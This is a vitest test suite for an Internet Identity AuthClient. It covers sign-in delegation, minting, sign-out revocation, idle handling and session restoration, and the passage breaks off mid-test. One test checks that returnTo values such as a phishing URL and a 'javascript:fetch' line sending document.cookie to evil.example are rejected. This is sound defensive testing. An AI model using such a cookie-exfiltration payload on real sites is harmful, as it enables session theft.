import type { PublicKey, SignIdentity } from '@icp-sdk/core/agent';
import { DelegationChain, Ed25519KeyIdentity } from '@icp-sdk/core/identity';
import { Principal } from '@icp-sdk/core/principal';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { AuthClient } from '../../src/client/auth-client.ts';
import type { IdentityStorage } from '../../src/client/identity-storage.ts';
import { IdleManager } from '../../src/client/idle-manager.ts';
import type { SessionIdentity } from '../../src/client/session-identity.ts';
import type { Session, SessionStorage } from '../../src/client/session-storage.ts';
import { FakeTransport } from './fake-transport.ts';

// In-memory identity storage that records every identity it creates, so tests
// can assert on create/set/remove calls and compare generated identities. Uses
// Ed25519 (synchronous, deterministic) rather than the ECDSA default. create()
// only mints; set() persists, mirroring the real stores.
function createIdentityStorage(
  initial: SignIdentity | null = null,
): IdentityStorage & { created: SignIdentity[] } {
  const created: SignIdentity[] = [];
  let current: SignIdentity | null = initial;
  return {
    created,
    create: vi.fn(async () => {
      const identity = Ed25519KeyIdentity.generate();
      created.push(identity);
      return identity;
    }),
    set: vi.fn(async (identity: SignIdentity) => {
      current = identity;
    }),
    get: vi.fn(async () => current),
    remove: vi.fn(async () => {
      current = null;
    }),
  };
}

/** The key a stored session's chain is rooted at, matching the mock's naming. */
const rootKeyOf = (storage: SessionStorage): string =>
  Array.from(new Uint8Array(storage.get()?.chain.publicKey ?? [])).join(',');

// In-memory delegation storage with spies on every method.
// Takes a chain rather than a Session so the tests below read as what they are
// about; the session wrapper is this helper's business.
function createSessionStorage(initial: DelegationChain | null = null): SessionStorage {
  let current: Session | null =
    initial === null ? null : { chain: initial, accountKey: initial.publicKey };
  return {
    get: vi.fn(() => current),
    set: vi.fn((session: Session) => {
      current = session;
    }),
    remove: vi.fn(() => {
      current = null;
    }),
    discard: vi.fn(() => {
      current = null;
    }),
    subscribe: vi.fn(() => () => {}),
  };
}

// A session storage whose change listener can be fired on demand, to simulate a
// sign-in or sign-out that happened in another tab or on a sibling origin.
// `external()` mutates the stored session and notifies the subscriber.
function controllableSessionStorage(initial: DelegationChain | null = null): {
  storage: SessionStorage;
  external(chain: DelegationChain | null): void;
} {
  let current: Session | null =
    initial === null ? null : { chain: initial, accountKey: initial.publicKey };
  let listener: (() => void) | null = null;
  return {
    storage: {
      get: () => current,
      set: (session: Session) => {
        current = session;
      },
      remove: () => {
        current = null;
      },
      discard: () => {
        current = null;
      },
      subscribe: (l: () => void) => {
        listener = l;
        return () => {
          listener = null;
        };
      },
    },
    external(chain: DelegationChain | null) {
      current = chain === null ? null : { chain, accountKey: chain.publicKey };
      listener?.();
    },
  };
}

const II_CANISTER = Principal.fromText('rdmx6-jaaaa-aaaaa-aaadq-cai');

// Minting is a canister call, so the source is replaced rather than the network.
// The timing it drives is covered in session-identity.test.ts; what matters here
// is that AuthClient mints once at sign-in and stores what came back. The mock
// fills in `minted.accountKey` so assertions can name the principal it roots at.
const minted = vi.hoisted(() => ({
  accountKey: undefined as SignIdentity | undefined,
  createdWith: [] as { canisterId?: unknown; agentOptions?: unknown }[],
  revokedSessions: [] as string[],
  count: 0,
  refuse: false,
  revoked: 0,
  revokeFails: false,
}));

vi.mock('../../src/client/session-minter.ts', async () => {
  const { DelegationChain: Chain, Ed25519KeyIdentity: Key } = await import(
    '@icp-sdk/core/identity'
  );
  const accountKey = Key.generate();
  minted.accountKey = accountKey;
  // Names a session by the key its chain is rooted at, so an assertion can count
  // revocations of its own session rather than of whatever else is still alive.
  const rootOf = ({ publicKey }: { publicKey: Uint8Array }): string =>
    Array.from(new Uint8Array(publicKey)).join(',');
  return {
    SessionMinter: {
      create: async (options: {
        canisterId?: unknown;
        agentOptions?: unknown;
        sessionChain: { publicKey: Uint8Array };
      }) => ({
        mint: async (appPublicKey: Uint8Array) => {
          minted.createdWith.push({
            canisterId: options.canisterId,
            agentOptions: options.agentOptions,
          });
          minted.count += 1;
          if (minted.refuse) {
            const { SessionGoneError } = await import('../../src/client/app-delegation-source.ts');
            throw new SessionGoneError();
          }
          return Chain.create(
            accountKey,
            { toDer: () => appPublicKey } as unknown as PublicKey,
            new Date(Date.now() + 5 * 60 * 1000),
          );
        },
        revoke: async () => {
          if (minted.revokeFails) throw new Error('offline');
          minted.revoked += 1;
          minted.revokedSessions.push(rootOf(options.sessionChain));
        },
      }),
    },
  };
});

// Swap `PostMessageTransport` for `FakeTransport` so `AuthClient` uses the real
// `Signer` over an in-memory transport — no window is opened and nothing about
// the signer's JSON-RPC correlation is faked. `UrlTransport` is kept as the
// real export so the constructor's `instanceof UrlTransport` transport-select
// check behaves; redirect-flow tests replace it separately.
vi.mock('@icp-sdk/signer/web', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@icp-sdk/signer/web')>();
  const { FakeTransport } = await import('./fake-transport.ts');
  return { ...actual, PostMessageTransport: FakeTransport };
});

function toBase64(bytes: Uint8Array): string {
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary);
}

function fromBase64(value: string): Uint8Array {
  const binary = atob(value);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return bytes;
}

async function createTestDelegation(key: Ed25519KeyIdentity, expiration?: Date) {
  const exp = expiration ?? new Date(Date.now() + 24 * 60 * 60 * 1000); // 1 day from now
  return DelegationChain.create(key, key.getPublicKey(), exp);
}

function encodeDelegationChainResponse(chain: DelegationChain) {
  return {
    publicKey: toBase64(new Uint8Array(chain.publicKey)),
    signerDelegation: chain.delegations.map((sd) => ({
      delegation: {
        pubkey: toBase64(new Uint8Array(sd.delegation.pubkey)),
        expiration: sd.delegation.expiration.toString(),
        targets: sd.delegation.targets?.map((t) => t.toText()),
      },
      signature: toBase64(new Uint8Array(sd.signature)),
    })),
  };
}

type JsonRpcBody =
  | { result: unknown }
  | { error: { code: number; message: string; data?: unknown } };

const DEFAULT_REQUEST_ATTRIBUTES_BODY: JsonRpcBody = {
  result: { data: btoa('hello'), signature: btoa('sig') },
};

// A session-chain response as Internet Identity builds it: a chain to the
// requested session key, restricted to the Internet Identity canister, and
// lasting as long as the session the user consented to.
async function conformantSignInBody(params: { sessionPublicKey: string }): Promise<JsonRpcBody> {
  const to = { toDer: () => fromBase64(params.sessionPublicKey) } as unknown as PublicKey;
  const chain = await DelegationChain.create(
    Ed25519KeyIdentity.generate(),
    to,
    new Date(Date.now() + 60 * 60 * 1000),
    { targets: [II_CANISTER] },
  );
  return { result: encodeDelegationChainResponse(chain) };
}

/**
 * Registers an `ii_session_delegation` handler. By default it returns a session
 * chain to the requested key; pass `body` to force a specific response.
 */
function handleSignIn(transport: FakeTransport, body?: JsonRpcBody): void {
  transport.onRequest(async (req) => {
    if (req.method !== 'ii_session_delegation') return;
    if (req.id === undefined || req.id === null) return;
    const resolved = body ?? (await conformantSignInBody(req.params as never));
    return { jsonrpc: '2.0', id: req.id, ...resolved };
  });
}

/**
 * Registers an `ii-icrc3-attributes` handler that returns the given body.
 * Defaults to a valid success response with placeholder data and signature.
 */
function handleRequestAttributes(
  transport: FakeTransport,
  body: JsonRpcBody = DEFAULT_REQUEST_ATTRIBUTES_BODY,
): void {
  transport.onRequest((req) => {
    if (req.method !== 'ii-icrc3-attributes') return;
    if (req.id === undefined || req.id === null) return;
    return { jsonrpc: '2.0', id: req.id, ...body };
  });
}

beforeEach(() => {
  vi.unstubAllGlobals();
  vi.useRealTimers();
  localStorage.clear();
  FakeTransport.reset();
  // `IdleManager.exit()` runs all registered callbacks on teardown (see
  // idle-manager.ts#exit), including the default `location.reload()` callback
  // from signed-in tests. Stub globally so afterEach teardown doesn't trigger
  // jsdom's "Not implemented: navigation to another Document" warning.
  vi.stubGlobal('location', { reload: vi.fn() });
});

afterEach(async () => {
  // IdleManager is a singleton — without tearing it down, idle timers and DOM
  // listeners from one test bleed into the next, causing spurious failures.
  try {
    IdleManager.create().exit();
  } catch {
    // no-op if already torn down
  }
  await new Promise((r) => setTimeout(r, 0));
  localStorage.clear();
});

describe('AuthClient', () => {
  it('should initialize with an AnonymousIdentity', async () => {
    const client = new AuthClient();
    expect(client.isAuthenticated()).toBe(false);
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
  });

  it('should use a provided identity as the key for hydration', async () => {
    const identity = Ed25519KeyIdentity.generate();
    const chain = await createTestDelegation(identity);
    const client = new AuthClient({ identity, sessionStorage: createSessionStorage(chain) });
    const resolved = await client.getIdentity();
    expect(resolved.getPrincipal().isAnonymous()).toBe(false);
  });

  it('should sign users out', async () => {
    const client = new AuthClient();
    await client.signOut();
    expect(client.isAuthenticated()).toBe(false);
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
  });

  it('navigates to a same-origin returnTo on sign out', async () => {
    vi.stubGlobal('location', {
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    const pushState = vi.spyOn(window.history, 'pushState').mockImplementation(() => {});
    await client.signOut({ returnTo: '/logged-out' });
    expect(pushState).toHaveBeenCalledWith({}, '', 'http://localhost/logged-out');
    pushState.mockRestore();
  });

  it('falls back to a location navigation to the validated target when pushState throws', async () => {
    vi.stubGlobal('location', {
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    const pushState = vi.spyOn(window.history, 'pushState').mockImplementation(() => {
      throw new Error('pushState unavailable');
    });
    await client.signOut({ returnTo: '/logged-out' });
    // Fallback navigates to the resolved, validated same-origin URL — never the raw string.
    expect(window.location.href).toBe('http://localhost/logged-out');
    pushState.mockRestore();
  });

  it('refuses a cross-origin, protocol-relative, or javascript: returnTo', async () => {
    // A concrete same-origin location so `//evil.example` resolves (to
    // http://evil.example/) and is rejected on the origin check — not because
    // the base is undefined.
    vi.stubGlobal('location', {
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    const pushState = vi.spyOn(window.history, 'pushState');
    for (const returnTo of [
      'https://evil.example/phish',
      '//evil.example',
      'javascript:fetch("https://evil.example/" + document.cookie)',
    ]) {
      await client.signOut({ returnTo });
    }
    // Neither sink is reached: no history entry, and the location.href fallback
    // never navigated away from the current page.
    expect(pushState).not.toHaveBeenCalled();
    expect(window.location.href).toBe('http://localhost/app');
    pushState.mockRestore();
  });

  it('should not initialize an idleManager if the user is not signed in', async () => {
    const client = new AuthClient();
    await client.getIdentity(); // wait for hydration
    expect(client.idleManager).toBeUndefined();
  });

  it.each([
    ['google', 'https://accounts.google.com'],
    ['apple', 'https://appleid.apple.com'],
    ['microsoft', 'https://login.microsoftonline.com/{tid}/v2.0'],
  ] as const)('should pass openid=%s search param to the transport', (provider, expectedUrl) => {
    new AuthClient({ openIdProvider: provider });
    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.get('openid')).toBe(expectedUrl);
  });

  it('should not include openid search param when openIdProvider is not set', () => {
    new AuthClient();
    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.has('openid')).toBe(false);
  });

  it('should forward windowOpenerFeatures to the transport', () => {
    new AuthClient({ windowOpenerFeatures: 'width=500,height=600' });
    expect(FakeTransport.last().options.windowOpenerFeatures).toBe('width=500,height=600');
  });

  it('should not set up an idle timer if the disable option is set', () => {
    const client = new AuthClient({
      idleOptions: {
        idleTimeout: 1000,
        disableIdle: true,
      },
    });
    expect(client.idleManager).toBeUndefined();
  });

  it('memoize runs the producer and returns its value in window mode', async () => {
    const client = new AuthClient(); // default 'window' transport
    const produce = vi.fn(async () => 'value');

    expect(await client.memoize(produce)).toBe('value');
    expect(produce).toHaveBeenCalledOnce();
  });
});

describe('AuthClient signIn', () => {
  it('should return the authenticated identity', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    const identity = await client.signIn();
    expect(identity.getPrincipal().toString()).toBeTruthy();
  });

  it('should set up an idle manager after sign-in', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(client.idleManager).toBeDefined();
  });

  it('should not set up an idle manager if disableIdle is set', async () => {
    const client = new AuthClient({ idleOptions: { disableIdle: true } });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(client.idleManager).toBeUndefined();
  });

  it('should propagate signer errors from the delegation request', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last(), {
      error: { code: -1, message: 'connection failed' },
    });
    await expect(client.signIn()).rejects.toThrow('connection failed');
  });

  it('does not clear a session another tab signed in with', async () => {
    // Both tabs share localStorage and IndexedDB, so both share the session.
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();

    const tabB = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    const identityB = (await tabB.signIn()) as SessionIdentity;

    // Signing in replaces whatever session this browser held, so tab B's is now
    // gone at the canister and storage carries the one tab A just obtained.
    const tabA = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    await tabA.signIn();
    const sessionA = sessionStorage.get();

    // Tab B keeps using what it holds. Past that delegation's life, so the
    // request has to mint, and the mint is refused.
    minted.refuse = true;
    vi.useFakeTimers();
    vi.setSystemTime(new Date(Date.now() + 10 * 60 * 1000));
    await identityB
      .transformRequest({ body: { arg: new Uint8Array() } } as never)
      .catch(() => undefined);
    vi.useRealTimers();
    minted.refuse = false;

    expect(sessionStorage.get()).toEqual(sessionA);
    expect(tabA.isAuthenticated()).toBe(true);
  });

  it('discards a dead session without retracting what the domain shares', async () => {
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    const identity = await client.signIn();

    // The session is gone at the canister, so the next mint is refused.
    minted.refuse = true;
    vi.useFakeTimers();
    vi.setSystemTime(new Date(Date.now() + 10 * 60 * 1000));
    await identity
      .transformRequest({ body: { arg: new Uint8Array() } } as never)
      .catch(() => undefined);
    vi.useRealTimers();
    minted.refuse = false;

    // Finding out is not signing out. A store that publishes the session beyond
    // this origin keeps doing so, because a sibling may hold a good copy.
    expect(sessionStorage.discard).toHaveBeenCalled();
    expect(sessionStorage.remove).not.toHaveBeenCalled();
    // The session key signs for this session alone, so it goes with it rather
    // than being left behind with no chain.
    expect(identityStorage.remove).toHaveBeenCalled();
    expect(client.isAuthenticated()).toBe(false);
    client.dispose();
  });

  it('signs with a key nothing can export', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;

    // The app key travels to other tabs of this origin, so it has to be a handle
    // that signs rather than material that can be copied.
    await expect(identity.sign(new Uint8Array([1, 2, 3]))).resolves.toBeDefined();
    const key = (identity as unknown as { getKeyPair?: () => CryptoKeyPair }).getKeyPair?.();
    expect(key?.privateKey.extractable ?? false).toBe(false);
  });

  it('mints inside the ceremony, so the first request after it does not wait', async () => {
    minted.count = 0;
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());

    const identity = await client.signIn();
    expect(minted.count).toBe(1);

    // The identity already holds a delegation, so signing a request needs no
    // second mint.
    await identity.transformRequest({ body: { arg: new Uint8Array() } } as never);

    expect(minted.count).toBe(1);
  });

  it('stores the account key from the mint, not the session chain root', async () => {
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ sessionStorage });
    handleSignIn(FakeTransport.last());

    await client.signIn();

    const stored = sessionStorage.get();
    // The chain is rooted at the session's own key; the account key comes back
    // from the mint and is the only record of who an app sees as the caller.
    expect(stored?.accountKey).toEqual(minted.accountKey?.getPublicKey().toDer());
    expect(stored?.accountKey).not.toEqual(stored?.chain.publicKey);
  });

  it('hands back an identity whose principal is the account', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());

    const identity = await client.signIn();

    expect(identity.getPrincipal().toText()).toBe(minted.accountKey?.getPrincipal().toText());
  });

  /** Flushes microtasks until `changed()`, or a bounded number of turns. */
  const settle = async (changed: () => boolean): Promise<void> => {
    for (let turn = 0; turn < 50 && !changed(); turn++) await vi.advanceTimersByTimeAsync(0);
  };

  it('mints on the page load that restores a session, before any request', async () => {
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();
    const first = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    await first.signIn();
    first.dispose();

    minted.count = 0;
    const restored = new AuthClient({ identityStorage, sessionStorage });

    // `pageshow` fires as part of the load, which is before the asynchronous
    // restore has produced an identity. The refresh has to wait for it, or the
    // load mints nothing and the first user action pays for the round trip.
    globalThis.dispatchEvent(new Event('pageshow'));
    // Generous: where tabs share credentials, the load first waits out the
    // inherit window before minting for itself.
    for (let i = 0; i < 400 && minted.count === 0; i++) {
      await new Promise((resolve) => setTimeout(resolve, 5));
    }

    expect(minted.count).toBe(1);
    restored.dispose();
  });

  it('mints when the tab comes back, if one is due', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    // The clock moves while the tab is in the background; its own timers do not
    // run, which is the case this trigger exists for.
    vi.useFakeTimers();
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    document.dispatchEvent(new Event('visibilitychange'));
    await settle(() => identity.getDelegation() !== held);
    vi.useRealTimers();

    expect(identity.getDelegation()).not.toBe(held);
    client.dispose();
  });

  it('costs nothing to glance at a tab whose delegation is healthy', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    document.dispatchEvent(new Event('visibilitychange'));
    await Promise.resolve();

    expect(identity.getDelegation()).toBe(held);
    client.dispose();
  });

  it('hooks nothing when foreground refresh is turned off', async () => {
    const client = new AuthClient({ disableForegroundRefresh: true });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    vi.useFakeTimers();
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    document.dispatchEvent(new Event('visibilitychange'));
    await settle(() => false);
    vi.useRealTimers();

    expect(identity.getDelegation()).toBe(held);
    client.dispose();
  });

  it('ends the session at the canister before clearing what it holds', async () => {
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ sessionStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    // Counted per session: undisposed clients from other tests can sign out at
    // any moment, and a shared tally would pick their revocations up as this one.
    const mine = rootKeyOf(sessionStorage);

    await client.signOut();

    expect(minted.revokedSessions.filter((root) => root === mine)).toHaveLength(1);
    expect(sessionStorage.get()).toBeNull();
    expect(client.isAuthenticated()).toBe(false);
  });

  it('signs out locally even when the canister cannot be reached', async () => {
    minted.revokeFails = true;
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ sessionStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    // A user who pressed sign out has to end up signed out on this device,
    // whatever the network did.
    await expect(client.signOut()).resolves.toBeUndefined();

    expect(sessionStorage.get()).toBeNull();
    expect(client.isAuthenticated()).toBe(false);
    minted.revokeFails = false;
  });

  it('has nothing to revoke when no session is held', async () => {
    const before = minted.revokedSessions.length;
    const client = new AuthClient({ sessionStorage: createSessionStorage() });

    await client.signOut();

    // No session, so no call. Compared against a snapshot rather than zero,
    // because another test's client may revoke while this one runs.
    expect(minted.revokedSessions).toHaveLength(before);
  });

  it('reports a restored session synchronously, before anything async runs', async () => {
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();
    const first = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    await first.signIn();
    minted.count = 0;

    // A second client over the same storage is a reload. isAuthenticated() reads
    // the stored session and nothing else: no mint, no network, no IndexedDB.
    const reloaded = new AuthClient({ identityStorage, sessionStorage });

    expect(reloaded.isAuthenticated()).toBe(true);
    expect(minted.count).toBe(0);
  });

  it('stops reporting a session the canister has dropped', async () => {
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ sessionStorage });
    handleSignIn(FakeTransport.last());
    const identity = await client.signIn();
    expect(client.isAuthenticated()).toBe(true);

    // Past the session's own end, so the next mint is refused as terminal. A
    // revocation reaches the client the same way: through a failed mint.
    vi.setSystemTime(new Date(Date.now() + 2 * 60 * 60 * 1000));
    await identity.transformRequest({ body: { arg: new Uint8Array() } } as never).catch(() => {});

    expect(client.isAuthenticated()).toBe(false);
  });

  it('mints against the mainnet canister when none is configured', async () => {
    minted.createdWith = [];
    const client = new AuthClient({ sessionStorage: createSessionStorage() });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    expect(minted.createdWith[0]?.canisterId?.toString()).toBe('rdmx6-jaaaa-aaaaa-aaadq-cai');
    expect(minted.createdWith[0]?.agentOptions).toBeUndefined();
    client.dispose();
  });

  it('mints against the configured canister, over the configured agent', async () => {
    minted.createdWith = [];
    const agentOptions = { host: 'http://localhost:4943', shouldFetchRootKey: true };
    const client = new AuthClient({
      sessionStorage: createSessionStorage(),
      identityProvider: { canisterId: 'aaaaa-aa' },
      agentOptions,
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    expect(minted.createdWith[0]?.canisterId?.toString()).toBe('aaaaa-aa');
    expect(minted.createdWith[0]?.agentOptions).toEqual(agentOptions);
    client.dispose();
  });

  it('renders the ceremony at the configured authorize URL', () => {
    new AuthClient({ identityProvider: { authorizeUrl: 'http://id.ai.localhost:8000' } });
    const url = new URL(FakeTransport.last().options.url ?? '');

    // The authorize URL and the canister are separate addresses: setting one
    // leaves the other at its default.
    expect(url.origin).toBe('http://id.ai.localhost:8000');
  });

  it('releases the identity it displaces, and its own on dispose', async () => {
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    const first = (await client.signIn()) as SessionIdentity;

    // Signing in again replaces the identity. The displaced one must not be left
    // holding an armed refresh that would mint and record the session as used on
    // behalf of an object nothing can reach.
    const released = vi.spyOn(first, 'dispose');
    handleSignIn(FakeTransport.last());
    const second = (await client.signIn()) as SessionIdentity;
    expect(released).toHaveBeenCalled();

    const secondReleased = vi.spyOn(second, 'dispose');
    client.dispose();
    expect(secondReleased).toHaveBeenCalled();
  });

  it('answers for a restored session without minting', async () => {
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();
    const first = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    await first.signIn();

    // A second client over the same storage is a reload.
    const restored = new AuthClient({ identityStorage, sessionStorage });
    const identity = await restored.getIdentity();

    expect(identity.getPrincipal().toText()).toBe(minted.accountKey?.getPrincipal().toText());
  });

  it('asks for a session, and not for what it cannot be given', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);

    await client.signIn();

    const req = transport.requests[0];
    expect(req.method).toBe('ii_session_delegation');
    expect(req.params?.sessionPublicKey).toBeTypeOf('string');
    // An access level is the user's alone, and an app delegation's targets are
    // the canister's, so neither is something to ask for here.
    expect(req.params?.targets).toBeUndefined();
  });

  it('forwards a requested session ceiling, and omits it when absent', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    await client.signIn({ maxTimeToLive: 3_600_000_000_000n });
    expect(FakeTransport.last().requests[0]?.params?.maxTimeToLive).toBe('3600000000000');

    FakeTransport.reset();
    const plain = new AuthClient();
    handleSignIn(FakeTransport.last());
    await plain.signIn();
    expect(FakeTransport.last().requests[0]?.params?.maxTimeToLive).toBeUndefined();
  });

  it('should forward derivationOrigin on every request as icrc95DerivationOrigin', async () => {
    const client = new AuthClient({ derivationOrigin: 'https://example.com' });
    const transport = FakeTransport.last();
    handleSignIn(transport);

    await client.signIn();

    expect(transport.requests[0].params?.icrc95DerivationOrigin).toBe('https://example.com');
  });

  it('should persist the delegation and create a session identity on sign-in', async () => {
    const identityStorage = createIdentityStorage();
    const sessionStorage = createSessionStorage();
    const client = new AuthClient({ identityStorage, sessionStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    expect(identityStorage.create).toHaveBeenCalledTimes(1);
    expect(sessionStorage.set).toHaveBeenCalledWith(
      expect.objectContaining({ chain: expect.any(DelegationChain) }),
    );
  });

  it('should create a fresh identity for each sign-in', async () => {
    const identityStorage = createIdentityStorage();
    const client = new AuthClient({
      identityStorage,
      sessionStorage: createSessionStorage(),
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    await client.signIn();

    expect(identityStorage.create).toHaveBeenCalledTimes(2);
    expect(identityStorage.created).toHaveLength(2);
    expect(identityStorage.created[0].getPrincipal().toText()).not.toBe(
      identityStorage.created[1].getPrincipal().toText(),
    );
  });

  it('reports authenticated only after a successful sign-in', async () => {
    const client = new AuthClient({ idleOptions: { disableIdle: true } });
    handleSignIn(FakeTransport.last());
    expect(client.isAuthenticated()).toBe(false);
    await client.signIn();
    expect(client.isAuthenticated()).toBe(true);
  });

  it('reports unauthenticated after sign-out', async () => {
    const client = new AuthClient({ idleOptions: { disableIdle: true } });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(client.isAuthenticated()).toBe(true);
    await client.signOut();
    expect(client.isAuthenticated()).toBe(false);
  });

  it('navigates to a same-origin returnTo after sign-in', async () => {
    vi.stubGlobal('location', {
      reload: vi.fn(),
      replace: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());

    await client.signIn({ returnTo: '/next' });

    expect(window.location.replace).toHaveBeenCalledWith('http://localhost/next');
  });

  it('ignores a cross-origin returnTo', async () => {
    vi.stubGlobal('location', {
      reload: vi.fn(),
      replace: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());

    await client.signIn({ returnTo: 'https://evil.example/phish' });

    expect(window.location.replace).not.toHaveBeenCalled();
  });
});

describe('AuthClient idle behavior', () => {
  it('should sign out after idle and reload the window by default', async () => {
    const identityStorage = createIdentityStorage();
    const client = new AuthClient({
      identityStorage,
      idleOptions: { idleTimeout: 1000 },
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    expect(identityStorage.remove).not.toHaveBeenCalled();

    await new Promise((r) => setTimeout(r, 1100));

    expect(identityStorage.remove).toHaveBeenCalled();
    expect(window.location.reload).toHaveBeenCalled();
    expect(client.isAuthenticated()).toBe(false);
  });

  it('does not reload when idle sign-out fails (would otherwise restore the session)', async () => {
    const identityStorage = createIdentityStorage();
    identityStorage.remove = vi.fn().mockRejectedValue(new Error('storage unavailable'));
    const client = new AuthClient({ identityStorage, idleOptions: { idleTimeout: 1000 } });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    await new Promise((r) => setTimeout(r, 1100));

    // Teardown was attempted but failed; reloading now would `#hydrate` the
    // still-valid session, so the callback must swallow the error and not reload.
    expect(identityStorage.remove).toHaveBeenCalled();
    expect(window.location.reload).not.toHaveBeenCalled();
  });

  it('should not reload the page if the default callback is disabled', async () => {
    const identityStorage = createIdentityStorage();
    const client = new AuthClient({
      identityStorage,
      idleOptions: { idleTimeout: 1000, disableDefaultIdleCallback: true },
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    await new Promise((r) => setTimeout(r, 1100));

    expect(identityStorage.remove).not.toHaveBeenCalled();
    expect(window.location.reload).not.toHaveBeenCalled();
  });

  it('should call onIdle instead of the default behavior when provided', async () => {
    const idleCb = vi.fn();
    const client = new AuthClient({
      idleOptions: { idleTimeout: 1000, onIdle: idleCb },
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    // Wait for the idle timeout to fire (real timers).
    await new Promise((r) => setTimeout(r, 1100));

    expect(window.location.reload).not.toHaveBeenCalled();
    expect(idleCb).toHaveBeenCalled();
  });

  it('does not reload on idle when a listener is subscribed', async () => {
    // Default storage, so idle sign-out clears it and notifies subscribers.
    const client = new AuthClient({ idleOptions: { idleTimeout: 1000 } });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    const listener = vi.fn();
    client.subscribe(listener);

    await new Promise((r) => setTimeout(r, 1100));

    // A subscribed app re-renders from the notification instead of reloading.
    expect(window.location.reload).not.toHaveBeenCalled();
    await vi.waitFor(() => expect(listener).toHaveBeenCalled());
    expect(client.isAuthenticated()).toBe(false);
  });
});

describe('Session restoration', () => {
  const testSecrets = [
    '302a300506032b6570032100d1fa89134802051c8b5d4e53c08b87381b87097bca4c4f348611eb8ce6c91809',
    '4bbff6b476463558d7be318aa342d1a97778d70833038680187950e9e02486c0d1fa89134802051c8b5d4e53c08b87381b87097bca4c4f348611eb8ce6c91809',
  ];

  it('should restore an existing identity and delegation', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    const expiration = new Date('2020-01-03T00:00:00.000Z');
    const key = Ed25519KeyIdentity.fromJSON(JSON.stringify(testSecrets));
    const chain = await createTestDelegation(key, expiration);

    const client = new AuthClient({
      identityStorage: createIdentityStorage(key),
      sessionStorage: createSessionStorage(chain),
    });
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(false);
  });

  it('should remain anonymous with an identity but no delegation', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    const key = Ed25519KeyIdentity.fromJSON(JSON.stringify(testSecrets));
    const client = new AuthClient({
      identityStorage: createIdentityStorage(key),
      sessionStorage: createSessionStorage(null),
    });
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
  });

  it('should clear the delegation when it has expired', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    const expiration = new Date('2019-12-30T00:00:00.000Z');
